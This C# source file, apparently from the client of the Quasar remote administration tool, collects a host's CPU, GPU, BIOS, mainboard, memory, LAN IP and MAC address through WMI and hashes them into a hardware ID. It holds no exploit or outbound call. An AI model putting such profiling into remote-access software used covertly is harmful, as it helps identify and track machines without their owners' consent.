using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using System;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace Quasar.Client.IO
{
    /// <summary>
    /// Provides access to retrieve information about the used hardware devices.
    /// </summary>
    /// <remarks>Caches the retrieved information to reduce the slowdown of the slow WMI queries.</remarks>
    public static class HardwareDevices
    {
        /// <summary>
        /// Gets a unique hardware id as a combination of various hardware components.
        /// </summary>
        public static string HardwareId => _hardwareId ?? (_hardwareId = Sha256.ComputeHash(CpuName + MainboardName + BiosManufacturer));

        /// <summary>
        /// Used to cache the hardware id.
        /// </summary>
        private static string _hardwareId;

        /// <summary>
        /// Gets the name of the system CPU.
        /// </summary>
        public static string CpuName => _cpuName ?? (_cpuName = GetCpuName());

        /// <summary>
        /// Used to cache the CPU name.
        /// </summary>
        private static string _cpuName;

        /// <summary>
        /// Gets the name of the GPU.
        /// </summary>
        public static string GpuName => _gpuName ?? (_gpuName = GetGpuName());

        /// <summary>
        /// Used to cache the GPU name.
        /// </summary>
        private static string _gpuName;

        /// <summary>
        /// Gets the name of the BIOS manufacturer.
        /// </summary>
        public static string BiosManufacturer => _biosManufacturer ?? (_biosManufacturer = GetBiosManufacturer());

        /// <summary>
        /// Used to cache the BIOS manufacturer.
        /// </summary>
        private static string _biosManufacturer;

        /// <summary>
        /// Gets the name of the mainboard.
        /// </summary>
        public static string MainboardName => _mainboardName ?? (_mainboardName = GetMainboardName());

        /// <summary>
        /// Used to cache the mainboard name.
        /// </summary>
        private static string _mainboardName;

        /// <summary>
        /// Gets the total physical memory of the system in megabytes (MB).
        /// </summary>
        public static int? TotalPhysicalMemory => _totalPhysicalMemory ?? (_totalPhysicalMemory = GetTotalPhysicalMemoryInMb());

        /// <summary>
        /// Used to cache the total physical memory.
        /// </summary>
        private static int? _totalPhysicalMemory;

        /// <summary>
        /// Gets the LAN IP address of the network interface.
        /// </summary>
        public static string LanIpAddress => GetLanIpAddress();

        /// <summary>
        /// Gets the MAC address of the network interface.
        /// </summary>
        public static string MacAddress => GetMacAddress();

        private static string GetBiosManufacturer()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetMainboardName()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + " " + mObject["Product"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetCpuName()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName += mObject["Name"].ToString() + "; ";
                    }
                }
                cpuName = StringHelper.RemoveLastChars(cpuName);

                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static int GetTotalPhysicalMemoryInMb()
        {
            try
            {
                int installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRAM = (int)(bytes / 1048576); // bytes to MB
                        break;
                    }
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        private static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }
                gpuName = StringHelper.RemoveLastChars(gpuName);

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetLanIpAddress()
        {
            // TODO: support multiple network interfaces
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                                continue;

                            return ip.Address.ToString();
                        }
                    }
                }
            }

            return "-";
        }

        private static string GetMacAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIpAddress());
                    }

                    if (foundCorrect)
                        return StringHelper.GetFormattedMacAddress(ni.GetPhysicalAddress().ToString());
                }
            }

            return "-";
        }
    }
}
